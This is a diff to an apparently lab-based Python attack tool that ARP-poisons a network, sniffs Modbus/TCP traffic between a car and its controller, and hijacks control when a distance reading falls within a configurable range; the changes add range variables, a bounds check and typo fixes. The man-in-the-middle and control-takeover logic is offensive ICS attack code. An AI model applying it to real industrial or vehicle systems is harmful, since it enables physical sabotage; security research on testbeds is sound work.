@@ -26,6 +26,8 @@ ModbusPort=502 #Default modbus port 502
 carIP = "192.168.2.3" #IP from the car
 controlIP = "192.168.2.2" #IP from control
 MaxCount=5000 # Maximum sniffing of packets, if this amount of packets is reached the sniffer stops.
+AttackRangeMax = 170
+AttackRangeMin = 60
 #######################################################
 
 ######## Constants
@@ -355,7 +357,7 @@ def handlePacketLearning(pkt):
     return classifyPacket(pkt)
 
 def handlePacketAttacking(pkt):
-    global cs, lv, av, FUNC_CODE_PRINT, guiVars
+    global cs, lv, av, FUNC_CODE_PRINT, guiVars, AttackRangeMax, AttackRangeMin
     cs.starttime = time.time() * 1000
     pkt_src = pkt[IP].src
     guiVars.status = "ATTACKING"
@@ -377,17 +379,18 @@ def handlePacketAttacking(pkt):
         pkt_funcCode = pkt.funcCode
         if (pkt_funcCode == FUNC_READ_SR and pkt_src == cs.carIP):
             distance = pkt.registerVal[1]
-            if(distance < 200 and distance > 40):
+            if(distance < AttackRangeMax and distance > AttackRangeMin):
                 av.controlling = True
                 cs.distanceAsked = False
                 cs.directionASked = False
-                print("========================= **ATTACKER INITIZIATING ATTACK AT: " + time.strftime("%H:%M:%S"));
+                print("========================= **ATTACKER INITIALIZIZING ATTACK AT: " + time.strftime("%H:%M:%S"));
         if cs.packetCount%2 == 0:
             poisonARP(1, False)
         return False
 
     pkt_funcCode = pkt.funcCode
     localcount = av.packetCount + 1
+    if(localcount == len(lv.fullSeq) - 1): return True;
     while not (pkt_funcCode == lv.fullSeq[localcount].funcCode and pkt_src == lv.fullSeq[localcount][IP].src):
         #This small loop adjust the sequence of packages so it matches the current conversation between the controller and the car
         if(localcount == len(lv.fullSeq) - 1): return True;
@@ -548,7 +551,7 @@ if __name__ == "__main__":
     cs.resetSession()
     # GLib.idle_add(enableAttGui)
     sniff(filter="tcp and port " + str(ModbusPort) + " and not ether src " + cs.attackerMAC, stop_filter=handlePacketAttacking, store=0, count=MaxCount)
-    print("========================= **ATTACKER FINALZING ATTACK AT: " + time.strftime("%H:%M:%S"));
+    print("========================= **ATTACKER FINALIZING ATTACK AT: " + time.strftime("%H:%M:%S"));
     print "CLEANING ARP"
     arpClear()
     systemForward(False)
